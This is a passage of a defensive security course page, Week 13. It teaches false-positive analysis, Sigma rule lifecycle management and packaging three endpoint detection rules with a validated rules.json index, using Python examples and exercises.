+print(f&quot;FP parent distribution: {result[&#x27;fp_parent_distribution&#x27;]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>analyze_false_positive_cluster</code> to also analyze <code>user</code> distribution and <code>hostname</code> patterns. Add a <code>safe_to_filter_users</code> key (users that appear exclusively in FPs) and a <code>risky_to_filter_users</code> key (users that appear in both FPs and TPs — filtering them would suppress TPs). Add 3 more samples to the list: two more FPs from sccm.exe and one TP from a different parent with the same user as one of the FPs. Re-run and print the risky users.
+Expected output: safe_to_filter_parents includes sccm.exe; risky_to_filter_users lists any user shared between FPs and TPs</p>
+<hr />
+<h3>Concept 2 — Rule Lifecycle Management</h3>
+<p>A detection rule has a lifecycle: draft → experimental → production → deprecated. Managing this lifecycle prevents rules from staying in &quot;experimental&quot; indefinitely, accumulates tuning history, and ensures deprecated rules do not silently stop firing.</p>
+<p>Rule lifecycle stages:</p>
+<ul>
+<li><strong>Draft</strong>: written, not yet deployed — no alerts generated</li>
+<li><strong>Experimental</strong>: deployed to a non-alerting &quot;observation mode&quot; — events logged but not paged</li>
+<li><strong>Production</strong>: deployed and alerting — SNR ≥ 0.80, reviewed by analyst</li>
+<li><strong>Tuning</strong>: back in experimental after SNR drops below threshold — tuning in progress</li>
+<li><strong>Deprecated</strong>: disabled with documentation of why (replaced by a better rule, log source retired, technique no longer relevant)</li>
+</ul>
+<p>Lifecycle transitions must be logged: when, by whom, and why. This creates an audit trail for compliance and a knowledge base for future rule authors.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from typing import List, Optional
+from enum import Enum
+from datetime import date
+
+class RuleStatus(str, Enum):
+    DRAFT       = &quot;draft&quot;
+    EXPERIMENTAL = &quot;experimental&quot;
+    PRODUCTION  = &quot;production&quot;
+    TUNING      = &quot;tuning&quot;
+    DEPRECATED  = &quot;deprecated&quot;
+
+@dataclass
+class StatusTransition:
+    from_status: RuleStatus
+    to_status: RuleStatus
+    date: date
+    author: str
+    reason: str
+
+@dataclass
+class ManagedRule:
+    rule_id: str
+    title: str
+    status: RuleStatus = RuleStatus.DRAFT
+    history: List[StatusTransition] = field(default_factory=list)
+    current_snr: Optional[float] = None
+
+    def transition(self, new_status: RuleStatus, author: str, reason: str):
+        self.history.append(StatusTransition(
+            from_status=self.status,
+            to_status=new_status,
+            date=date.today(),
+            author=author,
+            reason=reason,
+        ))
+        self.status = new_status
+
+    def lifecycle_summary(self) -&gt; str:
+        lines = [f&quot;Rule {self.rule_id}: {self.title} [{self.status.value}]&quot;]
+        for t in self.history:
+            lines.append(f&quot;  {t.date} | {t.from_status.value} → {t.to_status.value} | {t.author}: {t.reason}&quot;)
+        return &quot;\n&quot;.join(lines)
+
+rule = ManagedRule(&quot;SIG-001&quot;, &quot;PowerShell Encoded Command&quot;)
+rule.transition(RuleStatus.EXPERIMENTAL, &quot;alice&quot;, &quot;Initial deployment for observation — 30-day FP baseline collection&quot;)
+rule.transition(RuleStatus.PRODUCTION,   &quot;alice&quot;, &quot;SNR=0.92 after filtering sccm.exe parent; promoted&quot;)
+rule.current_snr = 0.92
+rule.transition(RuleStatus.TUNING,       &quot;bob&quot;,   &quot;SNR dropped to 0.61 after new SCCM version release; re-tuning filter&quot;)
+
+print(rule.lifecycle_summary())
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add a method <code>snr_check(self, new_snr: float, author: str) -&gt; Optional[str]</code> to <code>ManagedRule</code> that automatically transitions the rule to <code>TUNING</code> if SNR drops below 0.80 when the rule is in <code>PRODUCTION</code> status, and returns a string describing the transition. If the rule is already in <code>TUNING</code> and SNR rises above 0.80, transition it back to <code>PRODUCTION</code>. Call the method three times with SNR values 0.85, 0.72, 0.91 and print the lifecycle summary after each call.
+Expected output: first call: no transition (SNR fine); second call: transitions to TUNING; third call: transitions back to PRODUCTION</p>
+<hr />
+<h3>Concept 3 — Packaging the Three Production Rules</h3>
+<p>The Royal Road deliverable for W13 is three production Sigma rules: PowerShell execution (Day 2), LOLBin abuse (Day 3), and process hollowing (Day 4). The packaging step creates a consistent directory structure, adds a <code>rules.json</code> index file, and validates every rule through the CI pipeline defined in W10.</p>
+<p>Rule directory structure:</p>
+<pre><code>rules/
+├── endpoint/
+│   ├── powershell_encoded_command.yml
+│   ├── certutil_lolbin_abuse.yml
+│   └── process_hollowing_event25.yml
+└── rules.json
+</code></pre><p><code>rules.json</code> is the machine-readable index: rule ID, title, technique, status, file path, and last-modified date. The CI pipeline reads this index to validate that every listed rule file exists and passes linting.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import json
+import os
+from pathlib import Path
+from datetime import date
+
+RULES_INDEX = [
+    {
+        &quot;id&quot;:         &quot;a6e1fc00-9e2e-4b1a-9ac0-1234567890ab&quot;,
+        &quot;title&quot;:      &quot;Suspicious PowerShell Execution&quot;,
+        &quot;technique&quot;:  &quot;T1059.001&quot;,
+        &quot;status&quot;:     &quot;production&quot;,
+        &quot;level&quot;:      &quot;high&quot;,
+        &quot;file&quot;:       &quot;endpoint/powershell_encoded_command.yml&quot;,
+        &quot;last_modified&quot;: str(date.today()),
+    },
+    {
+        &quot;id&quot;:         &quot;b8f9e1a2-3d4c-5f6e-7890-abcdef012345&quot;,
+        &quot;title&quot;:      &quot;CertUtil Download or Decode Abuse&quot;,
+        &quot;technique&quot;:  &quot;T1105&quot;,
+        &quot;status&quot;:     &quot;production&quot;,
+        &quot;level&quot;:      &quot;high&quot;,
+        &quot;file&quot;:       &quot;endpoint/certutil_lolbin_abuse.yml&quot;,
+        &quot;last_modified&quot;: str(date.today()),
+    },
+    {
+        &quot;id&quot;:         &quot;c9d0e2f3-4a5b-6c7d-8e9f-012345678901&quot;,
+        &quot;title&quot;:      &quot;Process Hollowing via Sysmon Event 25&quot;,
+        &quot;technique&quot;:  &quot;T1055.012&quot;,
+        &quot;status&quot;:     &quot;production&quot;,
+        &quot;level&quot;:      &quot;critical&quot;,
+        &quot;file&quot;:       &quot;endpoint/process_hollowing_event25.yml&quot;,
+        &quot;last_modified&quot;: str(date.today()),
+    },
+]
+
+def validate_rules_index(index: list, rules_dir: str) -&gt; list[str]:
+    errors = []
+    seen_ids = set()
+    for entry in index:
+        if entry[&quot;id&quot;] in seen_ids:
+            errors.append(f&quot;Duplicate rule ID: {entry[&#x27;id&#x27;]}&quot;)
+        seen_ids.add(entry[&quot;id&quot;])
+        if entry[&quot;status&quot;] not in (&quot;production&quot;, &quot;experimental&quot;, &quot;draft&quot;, &quot;deprecated&quot;):
+            errors.append(f&quot;Invalid status for {entry[&#x27;id&#x27;]}: {entry[&#x27;status&#x27;]}&quot;)
+        if entry[&quot;level&quot;] not in (&quot;low&quot;, &quot;medium&quot;, &quot;high&quot;, &quot;critical&quot;):
+            errors.append(f&quot;Invalid level for {entry[&#x27;id&#x27;]}: {entry[&#x27;level&#x27;]}&quot;)
+    return errors
+
+errors = validate_rules_index(RULES_INDEX, &quot;rules/&quot;)
+if errors:
+    for e in errors:
+        print(f&quot;ERROR: {e}&quot;)
+else:
+    print(f&quot;Validation PASSED: {len(RULES_INDEX)} rules indexed&quot;)
+    for r in RULES_INDEX:
+        print(f&quot;  [{r[&#x27;status&#x27;].upper()}] {r[&#x27;id&#x27;][:8]}... {r[&#x27;title&#x27;]} ({r[&#x27;technique&#x27;]})&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>validate_rules_index</code> with two more checks: (1) every entry must have a <code>technique</code> field matching the pattern <code>T\d{4}(\.\d{3})?</code> (regex), (2) no two entries may have the same <code>title</code>. Add a deliberately broken entry to the index to test each check. Print the error messages. Then write a function <code>write_rules_index(index: list, output_path: str)</code> that serializes the index to JSON and writes it to disk. Call it and print <code>f&quot;rules.json written with {N} entries&quot;</code>.
+Expected output: validation catches duplicate title + invalid technique format; rules.json written with correct count</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can automate the weekly rule health report by reading the <code>rules.json</code> index, fetching SNR metrics from a simulated source, and generating a formatted report with tuning recommendations.
+<strong>Threat:</strong> An attacker who gains write access to <code>rules.json</code> can mark malicious-activity rules as &quot;deprecated&quot; without the change appearing as a rule file modification — the CI pipeline validates file existence but may miss index tampering.
+<strong>Opportunity:</strong> Use an LLM to suggest tuning filters for rules with low SNR by analyzing false positive patterns described in plain English.
+<strong>Prompt to try:</strong> <code>&quot;A Sigma rule for 'Suspicious PowerShell Execution' has an SNR of 0.61 after one week in production. The false positives are predominantly: (1) SCCM running encoded PowerShell for software deployment (ParentImage: sccm.exe, User: SYSTEM), (2) Intune management agent (ParentImage: intunemanagementextension.exe, User: SYSTEM), (3) A custom IT automation script (ParentImage: psexec.exe, User: CORP\\svc_deploy). Suggest Sigma filter blocks to add to this rule that will remove these false positives without suppressing true positives. Show the YAML filter blocks, explain why each is safe to add, and flag any risk of suppressing real detections.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 13</h2>
+<p><strong>Task:</strong> Write three production-ready Sigma rules targeting the most common endpoint attack patterns, package them with a rules index, and validate the package through the CI pipeline.
+<strong>Builds on:</strong> W10 <code>rules/</code> directory (existing Sigma rules + CI pipeline) + W12 <code>GAP_REPORT.md</code> (techniques prioritized for coverage)
+<strong>Deliverable:</strong> Three new files in <code>rules/endpoint/</code>:</p>
+<ol>
+<li><code>powershell_encoded_command.yml</code> — PowerShell execution (T1059.001): encoded command + download cradle + suspicious parent + ScriptBlock logging corroboration</li>
+<li><code>certutil_lolbin_abuse.yml</code> — CertUtil LOLBin abuse (T1105 + T1140): download and decode via certutil, with corporate URL filter</li>
+<li><code>process_hollowing_event25.yml</code> — Process hollowing (T1055.012): Sysmon Event ID 25 targeting sensitive processes, with security tool filter</li>
+</ol>
+<p>Plus:</p>
+<ul>
+<li><code>rules/rules.json</code> — machine-readable index of all three rules</li>
+<li><code>rules/endpoint/</code> directory created</li>
+<li>All three rules pass <code>sigma check</code> (or equivalent Python YAML parse + field validation)</li>
+</ul>
+<p>Script to validate the package: <code>python validate_rules.py</code> — reads <code>rules.json</code>, verifies each file exists and parses as valid YAML, checks required fields, prints PASS/FAIL per rule.</p>
+<p><strong>Stretch goal:</strong> Add a fourth rule: <code>mshta_remote_execution.yml</code> for MSHTA remote URL execution (T1218.005). Add it to <code>rules.json</code>. Write a <code>README.md</code> for the <code>rules/endpoint/</code> directory listing all rules, their techniques, status, and coverage tier. Run the CI pipeline from W10 against all four rules and confirm all pass.</p>
+<div class="pager"><a class="btn ghost" href="week-12.html">&larr; Week 12</a><a class="btn ghost" href="week-14.html">Week 14 &rarr;</a></div>
+</main></body></html>
